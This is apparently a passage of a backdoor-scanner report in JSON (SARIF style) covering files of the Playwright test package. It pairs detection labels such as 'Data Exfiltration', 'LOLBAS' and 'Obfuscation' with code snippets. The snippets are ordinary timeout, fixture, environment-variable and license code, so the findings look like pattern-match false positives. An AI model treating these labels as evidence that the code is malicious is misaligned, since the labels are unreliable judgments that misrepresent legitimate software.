                    "text": "  _createTimeoutError(running) {\n    var _runnable$fixture2;\n    let message = '';\n    const timeout = running.slot.timeout;\n    const runnable = running.runnable;\n    switch (runnable.type) {\n      case 'test':\n",
                    "rendered": {
                      "text": "  _createTimeoutError(running) {\n    var _runnable$fixture2;\n    let message = '';\n    const timeout = running.slot.timeout;\n    const runnable = running.runnable;\n    switch (runnable.type) {\n      case 'test':\n",
                      "markdown": "`  _createTimeoutError(running) {\n    var _runnable$fixture2;\n    let message = '';\n    const timeout = running.slot.timeout;\n    const runnable = running.runnable;\n    switch (runnable.type) {\n      case 'test':\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/timeoutManager.js"
                },
                "region": {
                  "startLine": 82,
                  "startColumn": 38,
                  "endLine": 82,
                  "endColumn": 47,
                  "snippet": {
                    "text": "  }\n  setTimeout(timeout) {\n    const slot = this._running ? this._running.slot : this._defaultSlot;\n    if (!slot.timeout) return; // Zero timeout means some debug mode - do not set a timeout.\n    slot.timeout = timeout;\n    if (this._running) this._updateTimeout(this._running);\n  }\n",
                    "rendered": {
                      "text": "  }\n  setTimeout(timeout) {\n    const slot = this._running ? this._running.slot : this._defaultSlot;\n    if (!slot.timeout) return; // Zero timeout means some debug mode - do not set a timeout.\n    slot.timeout = timeout;\n    if (this._running) this._updateTimeout(this._running);\n  }\n",
                      "markdown": "`  }\n  setTimeout(timeout) {\n    const slot = this._running ? this._running.slot : this._defaultSlot;\n    if (!slot.timeout) return; // Zero timeout means some debug mode - do not set a timeout.\n    slot.timeout = timeout;\n    if (this._running) this._updateTimeout(this._running);\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/timeoutManager.js"
                },
                "region": {
                  "startLine": 69,
                  "startColumn": 9,
                  "endLine": 69,
                  "endColumn": 18,
                  "snippet": {
                    "text": "      return;\n    }\n    running.deadline = running.start + (running.slot.timeout - running.slot.elapsed);\n    const timeout = running.deadline - (0, _utils.monotonicTime)();\n    if (timeout <= 0) running.timeoutPromise.reject(this._createTimeoutError(running));else running.timer = setTimeout(() => running.timeoutPromise.reject(this._createTimeoutError(running)), timeout);\n  }\n  defaultSlot() {\n",
                    "rendered": {
                      "text": "      return;\n    }\n    running.deadline = running.start + (running.slot.timeout - running.slot.elapsed);\n    const timeout = running.deadline - (0, _utils.monotonicTime)();\n    if (timeout <= 0) running.timeoutPromise.reject(this._createTimeoutError(running));else running.timer = setTimeout(() => running.timeoutPromise.reject(this._createTimeoutError(running)), timeout);\n  }\n  defaultSlot() {\n",
                      "markdown": "`      return;\n    }\n    running.deadline = running.start + (running.slot.timeout - running.slot.elapsed);\n    const timeout = running.deadline - (0, _utils.monotonicTime)();\n    if (timeout <= 0) running.timeoutPromise.reject(this._createTimeoutError(running));else running.timer = setTimeout(() => running.timeoutPromise.reject(this._createTimeoutError(running)), timeout);\n  }\n  defaultSlot() {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/fixtureRunner.js"
                },
                "region": {
                  "startLine": 259,
                  "startColumn": 36,
                  "endLine": 259,
                  "endColumn": 41,
                  "snippet": {
                    "text": "  }\n  async _setupFixtureForRegistration(registration, testInfo, runnable) {\n    if (registration.scope === 'test') this.testScopeClean = false;\n    let fixture = this.instanceForId.get(registration.id);\n    if (fixture) return fixture;\n    fixture = new Fixture(this, registration);\n    await fixture.setup(testInfo, runnable);\n",
                    "rendered": {
                      "text": "  }\n  async _setupFixtureForRegistration(registration, testInfo, runnable) {\n    if (registration.scope === 'test') this.testScopeClean = false;\n    let fixture = this.instanceForId.get(registration.id);\n    if (fixture) return fixture;\n    fixture = new Fixture(this, registration);\n    await fixture.setup(testInfo, runnable);\n",
                      "markdown": "`  }\n  async _setupFixtureForRegistration(registration, testInfo, runnable) {\n    if (registration.scope === 'test') this.testScopeClean = false;\n    let fixture = this.instanceForId.get(registration.id);\n    if (fixture) return fixture;\n    fixture = new Fixture(this, registration);\n    await fixture.setup(testInfo, runnable);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/fixtureRunner.js"
                },
                "region": {
                  "startLine": 238,
                  "startColumn": 40,
                  "endLine": 238,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    const params = {};\n    for (const name of names) {\n      const registration = this.pool.resolve(name);\n      const fixture = this.instanceForId.get(registration.id);\n      if (!fixture || fixture.failed) return null;\n      params[name] = fixture.value;\n    }\n",
                    "rendered": {
                      "text": "    const params = {};\n    for (const name of names) {\n      const registration = this.pool.resolve(name);\n      const fixture = this.instanceForId.get(registration.id);\n      if (!fixture || fixture.failed) return null;\n      params[name] = fixture.value;\n    }\n",
                      "markdown": "`    const params = {};\n    for (const name of names) {\n      const registration = this.pool.resolve(name);\n      const fixture = this.instanceForId.get(registration.id);\n      if (!fixture || fixture.failed) return null;\n      params[name] = fixture.value;\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/fixtureRunner.js"
                },
                "region": {
                  "startLine": 86,
                  "startColumn": 43,
                  "endLine": 86,
                  "endColumn": 48,
                  "snippet": {
                    "text": "    const params = {};\n    for (const name of this.registration.deps) {\n      const registration = this.runner.pool.resolve(name, this.registration);\n      const dep = this.runner.instanceForId.get(registration.id);\n      if (!dep) {\n        this.failed = true;\n        return;\n",
                    "rendered": {
                      "text": "    const params = {};\n    for (const name of this.registration.deps) {\n      const registration = this.runner.pool.resolve(name, this.registration);\n      const dep = this.runner.instanceForId.get(registration.id);\n      if (!dep) {\n        this.failed = true;\n        return;\n",
                      "markdown": "`    const params = {};\n    for (const name of this.registration.deps) {\n      const registration = this.runner.pool.resolve(name, this.registration);\n      const dep = this.runner.instanceForId.get(registration.id);\n      if (!dep) {\n        this.failed = true;\n        return;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/index.mjs"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 39,
                  "endLine": 7,
                  "snippet": {
                    "text": " *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": " *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "` *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/testServer.js"
                },
                "region": {
                  "startLine": 556,
                  "startColumn": 28,
                  "endLine": 556,
                  "endColumn": 34,
                  "snippet": {
                    "text": "function chunkToPayload(type, chunk) {\n  if (chunk instanceof Buffer) return {\n    type,\n    buffer: chunk.toString('base64')\n  };\n  return {\n    type,\n",
                    "rendered": {
                      "text": "function chunkToPayload(type, chunk) {\n  if (chunk instanceof Buffer) return {\n    type,\n    buffer: chunk.toString('base64')\n  };\n  return {\n    type,\n",
                      "markdown": "`function chunkToPayload(type, chunk) {\n  if (chunk instanceof Buffer) return {\n    type,\n    buffer: chunk.toString('base64')\n  };\n  return {\n    type,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/testServer.js"
                },
                "region": {
                  "startLine": 520,
                  "startColumn": 47,
                  "endLine": 520,
                  "endColumn": 58,
                  "snippet": {
                    "text": "      await (0, _server.openTraceInBrowser)(server.urlPrefix('human-readable'));\n    } else {\n      const page = await (0, _server.openTraceViewerApp)(server.urlPrefix('precise'), 'chromium', {\n        headless: (0, _utils.isUnderTest)() && process.env.PWTEST_HEADED_FOR_TEST !== '1',\n        persistentContextOptions: {\n          handleSIGINT: false\n        }\n",
                    "rendered": {
                      "text": "      await (0, _server.openTraceInBrowser)(server.urlPrefix('human-readable'));\n    } else {\n      const page = await (0, _server.openTraceViewerApp)(server.urlPrefix('precise'), 'chromium', {\n        headless: (0, _utils.isUnderTest)() && process.env.PWTEST_HEADED_FOR_TEST !== '1',\n        persistentContextOptions: {\n          handleSIGINT: false\n        }\n",
                      "markdown": "`      await (0, _server.openTraceInBrowser)(server.urlPrefix('human-readable'));\n    } else {\n      const page = await (0, _server.openTraceViewerApp)(server.urlPrefix('precise'), 'chromium', {\n        headless: (0, _utils.isUnderTest)() && process.env.PWTEST_HEADED_FOR_TEST !== '1',\n        persistentContextOptions: {\n          handleSIGINT: false\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/testServer.js"
                },
                "region": {
                  "startLine": 475,
                  "startColumn": 8,
                  "endLine": 475,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    await ((_this$_testRun2 = this._testRun) === null || _this$_testRun2 === void 0 ? void 0 : _this$_testRun2.run);\n  }\n  async _setInterceptStdio(intercept) {\n    if (process.env.PWTEST_DEBUG) return;\n    if (intercept) {\n      process.stdout.write = chunk => {\n        this._dispatchEvent('stdio', chunkToPayload('stdout', chunk));\n",
                    "rendered": {
                      "text": "    await ((_this$_testRun2 = this._testRun) === null || _this$_testRun2 === void 0 ? void 0 : _this$_testRun2.run);\n  }\n  async _setInterceptStdio(intercept) {\n    if (process.env.PWTEST_DEBUG) return;\n    if (intercept) {\n      process.stdout.write = chunk => {\n        this._dispatchEvent('stdio', chunkToPayload('stdout', chunk));\n",
                      "markdown": "`    await ((_this$_testRun2 = this._testRun) === null || _this$_testRun2 === void 0 ? void 0 : _this$_testRun2.run);\n  }\n  async _setInterceptStdio(intercept) {\n    if (process.env.PWTEST_DEBUG) return;\n    if (intercept) {\n      process.stdout.write = chunk => {\n        this._dispatchEvent('stdio', chunkToPayload('stdout', chunk));\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/testServer.js"
                },
                "region": {
                  "startLine": 405,
                  "startColumn": 75,
                  "endLine": 405,
                  "endColumn": 86,
                  "snippet": {
                    "text": "      outputDir: params.outputDir,\n      workers: params.workers\n    };\n    if (params.trace === 'on') process.env.PW_LIVE_TRACE_STACKS = '1';else process.env.PW_LIVE_TRACE_STACKS = undefined;\n    const {\n      config,\n      error\n",
                    "rendered": {
                      "text": "      outputDir: params.outputDir,\n      workers: params.workers\n    };\n    if (params.trace === 'on') process.env.PW_LIVE_TRACE_STACKS = '1';else process.env.PW_LIVE_TRACE_STACKS = undefined;\n    const {\n      config,\n      error\n",
                      "markdown": "`      outputDir: params.outputDir,\n      workers: params.workers\n    };\n    if (params.trace === 'on') process.env.PW_LIVE_TRACE_STACKS = '1';else process.env.PW_LIVE_TRACE_STACKS = undefined;\n    const {\n      config,\n      error\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/testServer.js"
                },
                "region": {
                  "startLine": 405,
                  "startColumn": 31,
                  "endLine": 405,
                  "endColumn": 42,
                  "snippet": {
                    "text": "      outputDir: params.outputDir,\n      workers: params.workers\n    };\n    if (params.trace === 'on') process.env.PW_LIVE_TRACE_STACKS = '1';else process.env.PW_LIVE_TRACE_STACKS = undefined;\n    const {\n      config,\n      error\n",
                    "rendered": {
                      "text": "      outputDir: params.outputDir,\n      workers: params.workers\n    };\n    if (params.trace === 'on') process.env.PW_LIVE_TRACE_STACKS = '1';else process.env.PW_LIVE_TRACE_STACKS = undefined;\n    const {\n      config,\n      error\n",
                      "markdown": "`      outputDir: params.outputDir,\n      workers: params.workers\n    };\n    if (params.trace === 'on') process.env.PW_LIVE_TRACE_STACKS = '1';else process.env.PW_LIVE_TRACE_STACKS = undefined;\n    const {\n      config,\n      error\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/processHost.js"
                },
                "region": {
                  "startLine": 95,
                  "startColumn": 29,
                  "endLine": 95,
                  "endColumn": 34,
                  "snippet": {
                    "text": "          const {\n            resolve,\n            reject\n          } = this._callbacks.get(id);\n          this._callbacks.delete(id);\n          if (error) {\n            const errorObject = new Error(error.message);\n",
                    "rendered": {
                      "text": "          const {\n            resolve,\n            reject\n          } = this._callbacks.get(id);\n          this._callbacks.delete(id);\n          if (error) {\n            const errorObject = new Error(error.message);\n",
                      "markdown": "`          const {\n            resolve,\n            reject\n          } = this._callbacks.get(id);\n          this._callbacks.delete(id);\n          if (error) {\n            const errorObject = new Error(error.message);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/processHost.js"
                },
                "region": {
                  "startLine": 60,
                  "startColumn": 10,
                  "endLine": 60,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        } : {})\n      },\n      stdio: ['ignore', options.onStdOut ? 'pipe' : 'inherit', options.onStdErr && !process.env.PW_RUNNER_DEBUG ? 'pipe' : 'inherit', 'ipc'],\n      ...(process.env.PW_TS_ESM_LEGACY_LOADER_ON ? {\n        execArgv: (0, _esmUtils.execArgvWithExperimentalLoaderOptions)()\n      } : {})\n    });\n",
                    "rendered": {
                      "text": "        } : {})\n      },\n      stdio: ['ignore', options.onStdOut ? 'pipe' : 'inherit', options.onStdErr && !process.env.PW_RUNNER_DEBUG ? 'pipe' : 'inherit', 'ipc'],\n      ...(process.env.PW_TS_ESM_LEGACY_LOADER_ON ? {\n        execArgv: (0, _esmUtils.execArgvWithExperimentalLoaderOptions)()\n      } : {})\n    });\n",
                      "markdown": "`        } : {})\n      },\n      stdio: ['ignore', options.onStdOut ? 'pipe' : 'inherit', options.onStdErr && !process.env.PW_RUNNER_DEBUG ? 'pipe' : 'inherit', 'ipc'],\n      ...(process.env.PW_TS_ESM_LEGACY_LOADER_ON ? {\n        execArgv: (0, _esmUtils.execArgvWithExperimentalLoaderOptions)()\n      } : {})\n    });\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/processHost.js"
                },
                "region": {
                  "startLine": 59,
                  "startColumn": 84,
                  "endLine": 59,
                  "endColumn": 95,
                  "snippet": {
                    "text": "          PW_TS_ESM_LOADER_ON: '1'\n        } : {})\n      },\n      stdio: ['ignore', options.onStdOut ? 'pipe' : 'inherit', options.onStdErr && !process.env.PW_RUNNER_DEBUG ? 'pipe' : 'inherit', 'ipc'],\n      ...(process.env.PW_TS_ESM_LEGACY_LOADER_ON ? {\n        execArgv: (0, _esmUtils.execArgvWithExperimentalLoaderOptions)()\n      } : {})\n",
                    "rendered": {
                      "text": "          PW_TS_ESM_LOADER_ON: '1'\n        } : {})\n      },\n      stdio: ['ignore', options.onStdOut ? 'pipe' : 'inherit', options.onStdErr && !process.env.PW_RUNNER_DEBUG ? 'pipe' : 'inherit', 'ipc'],\n      ...(process.env.PW_TS_ESM_LEGACY_LOADER_ON ? {\n        execArgv: (0, _esmUtils.execArgvWithExperimentalLoaderOptions)()\n      } : {})\n",
                      "markdown": "`          PW_TS_ESM_LOADER_ON: '1'\n        } : {})\n      },\n      stdio: ['ignore', options.onStdOut ? 'pipe' : 'inherit', options.onStdErr && !process.env.PW_RUNNER_DEBUG ? 'pipe' : 'inherit', 'ipc'],\n      ...(process.env.PW_TS_ESM_LEGACY_LOADER_ON ? {\n        execArgv: (0, _esmUtils.execArgvWithExperimentalLoaderOptions)()\n      } : {})\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/processHost.js"
                },
                "region": {
                  "startLine": 53,
                  "startColumn": 11,
                  "endLine": 53,
                  "endColumn": 22,
                  "snippet": {
                    "text": "    this.process = _child_process.default.fork(require.resolve('../common/process'), {\n      detached: false,\n      env: {\n        ...process.env,\n        ...this._extraEnv,\n        ...(_esmLoaderHost.esmLoaderRegistered ? {\n          PW_TS_ESM_LOADER_ON: '1'\n",
                    "rendered": {
                      "text": "    this.process = _child_process.default.fork(require.resolve('../common/process'), {\n      detached: false,\n      env: {\n        ...process.env,\n        ...this._extraEnv,\n        ...(_esmLoaderHost.esmLoaderRegistered ? {\n          PW_TS_ESM_LOADER_ON: '1'\n",
                      "markdown": "`    this.process = _child_process.default.fork(require.resolve('../common/process'), {\n      detached: false,\n      env: {\n        ...process.env,\n        ...this._extraEnv,\n        ...(_esmLoaderHost.esmLoaderRegistered ? {\n          PW_TS_ESM_LOADER_ON: '1'\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 416,
                  "endLine": 51,
                  "endColumn": 420,
                  "snippet": {
                    "text": " extends rf{constructor(e){if(super(e),typeof this.options.correctChoice!=\"number\"||this.options.correctChoice<0)throw new Error(\"Please specify the index of the correct answer from the list of choices\")}async toChoices(e,t){let i=await super.toChoices(e,t);if(i.length<2)throw new Error(\"Please give at least two choices to the user\");if(this.options.correctChoice>i.length)throw new Error(\"Please specify the index of the correct answer from the list of choices\");return i}check(e){return e.index===this.options.correctChoice}async result(e){return{selectedAnswer:e,correctAnswer:this.options.choices[t",
                    "rendered": {
                      "text": " extends rf{constructor(e){if(super(e),typeof this.options.correctChoice!=\"number\"||this.options.correctChoice<0)throw new Error(\"Please specify the index of the correct answer from the list of choices\")}async toChoices(e,t){let i=await super.toChoices(e,t);if(i.length<2)throw new Error(\"Please give at least two choices to the user\");if(this.options.correctChoice>i.length)throw new Error(\"Please specify the index of the correct answer from the list of choices\");return i}check(e){return e.index===this.options.correctChoice}async result(e){return{selectedAnswer:e,correctAnswer:this.options.choices[t",
                      "markdown": "` extends rf{constructor(e){if(super(e),typeof this.options.correctChoice!=\"number\"||this.options.correctChoice<0)throw new Error(\"Please specify the index of the correct answer from the list of choices\")}async toChoices(e,t){let i=await super.toChoices(e,t);if(i.length<2)throw new Error(\"Please give at least two choices to the user\");if(this.options.correctChoice>i.length)throw new Error(\"Please specify the index of the correct answer from the list of choices\");return i}check(e){return e.index===this.options.correctChoice}async result(e){return{selectedAnswer:e,correctAnswer:this.options.choices[t`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 141,
                  "endLine": 17,
                  "endColumn": 145,
                  "snippet": {
                    "text": "tion Tc(r,e){ei&&(Xe={},Ft={});for(var t=r.name||\"Error\",i=r.message||\"\",s=t+\": \"+i,n={nextPosition:null,curPosition:null},u=[],o=e.length-1;o>=0;o--)u.push(`\n    at `+jn(e[o],n)),n.nextPosition=n.curPosition;return n.curPosition=n.nextPosition=null,s+u.reverse().join(\"\")}function Gn(r){var e=/\\n    at [^(]+ \\((.*):(\\d+):(\\d+)\\)/.exec(r.stack);if(e){var t=e[1],i=+e[2],s=+e[3],n=Xe[t];if(!n&&Be&&Be.existsSync(t))try{n=Be.readFileSync(t,\"utf8\")}catch{n=\"\"}if(n){var u=n.split(/(?:\\r\\n|\\r|\\n)/)[i-1];if(u)return t+\":\"+i+`\n`+u+`\n`+new Array(s).join(\" \")+\"^\"}}return null}function Pc(r){var e=Gn(r),t=Rc()",
                    "rendered": {
                      "text": "tion Tc(r,e){ei&&(Xe={},Ft={});for(var t=r.name||\"Error\",i=r.message||\"\",s=t+\": \"+i,n={nextPosition:null,curPosition:null},u=[],o=e.length-1;o>=0;o--)u.push(`\n    at `+jn(e[o],n)),n.nextPosition=n.curPosition;return n.curPosition=n.nextPosition=null,s+u.reverse().join(\"\")}function Gn(r){var e=/\\n    at [^(]+ \\((.*):(\\d+):(\\d+)\\)/.exec(r.stack);if(e){var t=e[1],i=+e[2],s=+e[3],n=Xe[t];if(!n&&Be&&Be.existsSync(t))try{n=Be.readFileSync(t,\"utf8\")}catch{n=\"\"}if(n){var u=n.split(/(?:\\r\\n|\\r|\\n)/)[i-1];if(u)return t+\":\"+i+`\n`+u+`\n`+new Array(s).join(\" \")+\"^\"}}return null}function Pc(r){var e=Gn(r),t=Rc()",
                      "markdown": "`tion Tc(r,e){ei&&(Xe={},Ft={});for(var t=r.name||\"Error\",i=r.message||\"\",s=t+\": \"+i,n={nextPosition:null,curPosition:null},u=[],o=e.length-1;o>=0;o--)u.push(`\n    at `+jn(e[o],n)),n.nextPosition=n.curPosition;return n.curPosition=n.nextPosition=null,s+u.reverse().join(\"\")}function Gn(r){var e=/\\n    at [^(]+ \\((.*):(\\d+):(\\d+)\\)/.exec(r.stack);if(e){var t=e[1],i=+e[2],s=+e[3],n=Xe[t];if(!n&&Be&&Be.existsSync(t))try{n=Be.readFileSync(t,\"utf8\")}catch{n=\"\"}if(n){var u=n.split(/(?:\\r\\n|\\r|\\n)/)[i-1];if(u)return t+\":\"+i+`\n`+u+`\n`+new Array(s).join(\" \")+\"^\"}}return null}function Pc(r){var e=Gn(r),t=Rc()`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 3,
                  "endLine": 17,
                  "endColumn": 7,
                  "snippet": {
                    "text": "=function(){return o.source},r}var l=r.isEval()&&r.getEvalOrigin();return l&&(l=qn(l),r=Hn(r),r.getEvalOrigin=function(){return l}),r}function Tc(r,e){ei&&(Xe={},Ft={});for(var t=r.name||\"Error\",i=r.message||\"\",s=t+\": \"+i,n={nextPosition:null,curPosition:null},u=[],o=e.length-1;o>=0;o--)u.push(`\n    at `+jn(e[o],n)),n.nextPosition=n.curPosition;return n.curPosition=n.nextPosition=null,s+u.reverse().join(\"\")}function Gn(r){var e=/\\n    at [^(]+ \\((.*):(\\d+):(\\d+)\\)/.exec(r.stack);if(e){var t=e[1],i=+e[2],s=+e[3],n=Xe[t];if(!n&&Be&&Be.existsSync(t))try{n=Be.readFileSync(t,\"utf8\")}catch{n=\"\"}if(n){va",
                    "rendered": {
                      "text": "=function(){return o.source},r}var l=r.isEval()&&r.getEvalOrigin();return l&&(l=qn(l),r=Hn(r),r.getEvalOrigin=function(){return l}),r}function Tc(r,e){ei&&(Xe={},Ft={});for(var t=r.name||\"Error\",i=r.message||\"\",s=t+\": \"+i,n={nextPosition:null,curPosition:null},u=[],o=e.length-1;o>=0;o--)u.push(`\n    at `+jn(e[o],n)),n.nextPosition=n.curPosition;return n.curPosition=n.nextPosition=null,s+u.reverse().join(\"\")}function Gn(r){var e=/\\n    at [^(]+ \\((.*):(\\d+):(\\d+)\\)/.exec(r.stack);if(e){var t=e[1],i=+e[2],s=+e[3],n=Xe[t];if(!n&&Be&&Be.existsSync(t))try{n=Be.readFileSync(t,\"utf8\")}catch{n=\"\"}if(n){va",
